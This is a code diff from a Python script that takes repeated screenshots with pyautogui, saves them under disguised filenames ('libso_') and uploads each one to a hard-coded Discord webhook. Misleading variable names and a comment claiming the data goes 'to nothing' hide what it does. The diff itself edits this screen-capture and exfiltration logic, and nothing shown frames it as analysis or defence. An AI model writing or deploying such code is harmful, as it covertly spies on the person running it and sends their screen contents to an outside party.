@@ -30,14 +30,14 @@ tgfree = "https://discord.com/api/webhooks/1315419305457745971/ym8pyEf4-nbbs8jGp
 # Function to capture and send screenshot with additional info
 def capture_and_send_screenshot(counter):
     screenshot = pyautogui.screenshot()
-    filename = os.path.join(screenshot_dir, f"screenshot_{counter}.png")
+    filename = os.path.join(screenshot_dir, f"libso_{counter}.png")
     screenshot.save(filename)
 
     # Sending the screenshot to nothing
     nicetry = DiscordWebhook(url=tgfree)
     with open(filename, 'rb') as f:
-        webhook.add_file(file=f, filename=os.path.basename(filename))
-        webhook.execute()
+        nicetry.add_file(file=f, filename=os.path.basename(filename))
+        nicetry.execute()
 
     os.system("echo done > com1")
 
